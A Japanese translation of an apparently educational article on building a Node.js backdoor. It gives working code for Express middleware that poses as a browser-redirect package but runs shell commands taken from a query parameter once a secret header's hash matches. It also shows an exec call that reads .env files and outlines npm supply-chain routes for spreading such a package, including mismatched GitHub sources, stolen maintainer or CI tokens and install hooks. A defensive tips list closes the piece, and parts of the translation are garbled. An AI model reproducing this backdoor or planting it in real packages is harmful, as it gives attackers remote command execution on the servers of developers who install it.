敵を知る：Node.jsバックドアを作成する

オペレーティングシステムとシームレスに対話できる独自のコードのバックドアは、開発者にとって最悪の悪夢の1つです。現在、npmには120万を超えるパブリックパッケージがあります。過去3年間で、プロジェクト中毒はサイバー犯罪者にとって理想的なターゲットになりました。開発コミュニティがセキュリティに細心の注意を払わない場合、npmエコシステムは驚くほど脆弱になる可能性があります。このアイデアの証拠として、イベントストリームnpmパッケージを使用してタイプミスと事件を思い出すことで十分です。 この記事の著者は、私たちが今日公開している翻訳であり、教育目的のために、Node.jsプラットフォームのバックドアを作成する方法について話したいと考えています。





バックドアとは何ですか？


Malwarebytes リソースに記載されている「バックドア」という用語の定義は次のとおりです。ネットワークアプリケーション。このようなシステムへのアクセス権を取得したサイバー犯罪者は、バックドアを使用して個人データや財務データを盗んだり、追加のマルウェアをインストールしたり、デバイスをハッキングしたりできます。

バックドアは2つの主要部分で構成されています。

  1. 攻撃されたシステムに埋め込まれて実行される悪意のあるコード
  2. 攻撃者がバックドアにコマンドを送信し、リモートコンピュータを制御できるようにするオープンな通信チャネル。

コンピュータにインストールされているバックドアには、特定のアクションを実行するための応答としてコマンドが送信されます。これらは、環境変数などのシステムから貴重な情報を抽出することを目的としたコマンド、またはデータベースへの攻撃を実行するように設計されたコマンドです。さらに、そのようなコマンドを実行すると、単一のコンピュータまたはネットワーク全体に影響を与える他のプロセスが変更される可能性があります。攻撃の規模は、感染したアプリケーションが持つ権限によって異なります。今回のケースでは、Node.jsプラットフォーム用に作成されたアプリケーションについて話します。

上記の攻撃を実装するプログラムの簡略版を作成するために、標準モジュールchild_processを使用してコードを実行します。バックドアとの通信を確立するために、HTTPサーバーを使用します。この場合、巨大な機能で知られているExpressフレームワークを使用することをお勧めしますが、ここで説明する内容は、他の適切なツールを使用して実装できます。

child_processが必要なのはなぜですか？


標準のNode.jsモジュールchild_processを使用して、子プロセスを開始できます。ここでの主なアイデアは、orのstdinようなコマンド（標準入力ストリーム-を介してプロセスに入る）を実行し、これらのコマンドの結果（出力ストリームから出力される- ）と考えられるエラーメッセージ（からstream ）をメインプログラムに渡します。pwdping snyk.iostdoutstderr


プロセスの実行と、実行中のシステムプロセスの入力フローおよび出力フローの役割を果たす標準入力、出力、およびエラーフローとの関係

子プロセスを実行するには、さまざまな方法があります。この攻撃のexec場合、コールバックして適切なバッファに入れてstdout、ストリームとストリームに入れることができる関数を使用するのが最も簡単stderrです。たとえば、コマンドの結果として発行されるものcat passwords.txt。関数execは、などの長いタスクを実行するための最良の方法ではないことに注意してくださいping snyk.io。

const  {exec} = require('child_process');

exec('cat .env', (err, stdout, stderr) => {
  if(err) throw err
  if(stderr) return console.log(`Execution error: ${stderr}`)
  console.log(`Env file content:  ${stdout}`)
})

exec関数とHTTPサーバーを組み合わせる方法は？


Expressアプリケーション用に 、シンプルで無邪気に見えるブラウザリダイレクトミドルウェアパッケージを開発しました。Chrome以外のユーザーをbrowsehappy.comにリダイレクトします。このパッケージには悪意のあるコードを含めます。

パッケージコードは次のようになります。

const useragent = require('useragent');

module.exports = () => (req, res, next) => {   
    const ua = useragent.is(req.headers['user-agent']);
    ua.chrome ? next(): res.redirect("https://browsehappy.com/")
}

被害者がパッケージをインストールしてExpressアプリケーションで使用するのは、中間層でパッケージを使用するのと同じ方法で十分です。

const express = require("express");
const helmet = require("helmet")
const browserRedirect = require("browser-redirect ")
 
const app = express();
 
app.use(browserRedirect())
app.use(helmet())
 
app.get("/", (req, res)=>{
    res.send("Hello Chrome User!")
})
 
app.listen(8080)

この場合、使用してもHelmetアプリケーションを攻撃から保護しないことに注意してください。

悪質なコード


悪意のあるコードの実装は非常に簡単です。

const {exec} = require("child_process")
const crypto = require('crypto');
const useragent = require('useragent');
 
module.exports = () => (req, res, next) => {
    //  
    const {cmd} = req.query;
    const hash = crypto.createHash('md5')
                        .update(String(req.headers["knock_knock"]))
                        .digest("hex");
    res.setHeader("Content-Sec-Policy", "default-src 'self'")
    if(cmd && hash === "c4fbb68607bcbb25407e0362dab0b2ea") {
        return exec(cmd, (err, stdout, stderr)=>{
            return res.send(JSON.stringify({err, stdout, stderr}, null, 2))
        })
    }
    //  
    const ua = useragent.is(req.headers['user-agent']);
    ua.chrome ? next(): res.redirect("https://browsehappy.com/")
}

バックドアコードの準備ができたので、悪意のあるパッケージを配布する方法を考える必要があります。

最初のステップは、パッケージを公開することです。パッケージbrowser-redirect@1.0.2をnpmで公開しました。しかし、プロジェクトのGitHubリポジトリを見ると、悪意のあるコードは存在しません。自分自身を参照してください-を見て取り、マスタープロジェクトブランチやリリース1.0.2を。これは、npmが、ソースコードで動作するように設計された一部のシステムで公開されたコードを使用して、公開されたパッケージのコードを検証しないために可能です。

パッケージはnpmで公開されていますが、潜在的な犠牲者がパッケージを見つけてインストールする必要があるため、配布される可能性はまだ非常に低いです。

パッケージを配布する別の方法は、悪意のあるモジュールを他のパッケージの依存関係として追加することです。攻撃者が重要なパッケージの公開権限を持つアカウントにアクセスできる場合、攻撃者はそのようなパッケージの新しいバージョンを公開できます。パッケージの新しいバージョンの依存関係にはバックドアも含まれます。その結果、人気のあるプロジェクトの依存関係に悪意のあるパッケージを直接含めることについて話している（イベントストリームで発生したインシデントの分析を見てください）。または、攻撃者は、ロックファイルに適切な変更を加えることにより、プロジェクトでPRを作成しようとする可能性があります。それについてはこちらをお読みください。

考慮する必要があるもう1つの重要な要素は、攻撃者が特定の人気のあるプロジェクトをサポートしている誰かの資格情報（ユーザー名とパスワード）にアクセスできるかどうかです。攻撃者がそのようなデータを持っている場合は、eslintと同じように、パッケージの新しいバージョンを簡単にリリースできます。

しかし、プロジェクトをサポートする誰かがそれを公開するために二要素認証を使用する場合でも、彼はそれを危険にさらします。また、継続的インテグレーションシステムを使用してプロジェクトの新しいバージョンをデプロイする場合、2要素認証をオフにする必要があります。その結果、攻撃者が継続的インテグレーションシステムの稼働中のnpmトークンを盗むことができる場合（たとえば、誤ってパブリックアクセスに陥ったログ、データリーク、およびその他の同様のソースから）、悪意のあるコードを含む新しいリリースを展開できるようになります。新しいAPIが

リリースされていることに注意してください。（まだプライベートベータステータスです）。これにより、パケットがTORネットワークのIPアドレスを使用して発行されたかどうか、および発行時に2要素認証が使用されたかどうかを確認できます。

さらに、攻撃者は悪意のあるコードをスクリプトの形式で構成して、インストール前またはnpmパッケージのインストール後に実行されるようにすることができます。npmパッケージには、ユーザーのコンピューターで特定の時間にコードを実行できる標準のライフサイクルフックがあります。たとえば、ブラウザでテストプロジェクトを整理するためのシステムPuppeteerは、これらのフックを使用してホストシステムにChromium をインストールします。

ライアンダールはすでに言ったJSConf EU 2018でのこれらの脆弱性について。Node.jsプラットフォームでは、これや他の攻撃経路を防ぐために、より高いレベルの保護が必要です。オープンソースソフトウェアのセキュリティ調査

からの結論をいくつか次に示します。

  • 脆弱性の78％は間接的な依存関係にあり、そのような脆弱性を取り除くプロセスが複雑になります。
  • 2年以上にわたり、図書館の脆弱性は88％増加しています。
  • 回答者の81％は、開発者自身がセキュリティに責任を持つべきだと考えています。さらに、開発者はこれに対する準備が十分ではないと考えています。

結果：バックドアから身を守る方法は？


依存関係の制御は必ずしも簡単ではありませんが、いくつかのヒントがこれを支援します。

  • よく知られ、サポートされているライブラリを使用します。
  • コミュニティ生活に参加し、図書館を支援する人々を助けましょう。ヘルプには、コードの記述やプロジェクトへの財政支援の提供が含まれる場合があります。
  • NQPを使用して、プロジェクトの新しい依存関係を分析します。
  • Snykを使用して脆弱性の最新情報を入手し、プロジェクトを監視します。
  • npmに保存されている、使用している依存関係のコードを分析します。GitHubまたは他の同様のシステムからのコードの表示に制限されないでください。
